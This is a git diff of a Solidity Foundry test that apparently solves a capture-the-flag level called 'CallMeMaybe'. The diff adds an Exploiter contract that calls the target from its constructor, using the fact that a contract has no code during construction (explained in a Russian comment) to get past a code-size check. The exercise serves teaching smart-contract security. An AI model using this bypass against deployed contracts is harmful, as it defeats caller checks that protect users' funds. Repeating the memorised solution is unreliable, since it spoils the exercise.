@@ -3,6 +3,13 @@ pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
 import "src/05_CallMeMaybe/CallMeMaybe.sol";
+//используем конструктор контракта-эксплойта для вызова целевой функции,
+//потому что во время выполнения конструктора у контракта еще нет кода
+contract Exploiter {
+    constructor(CallMeMaybe target) {
+        target.hereIsMyNumber();
+    }
+}
 
 // forge test --match-contract CallMeMaybeTest -vvvv
 contract CallMeMaybeTest is BaseTest {
@@ -15,7 +22,8 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        vm.prank(user1);
+        new Exploiter(instance);
 
         checkSuccess();
     }
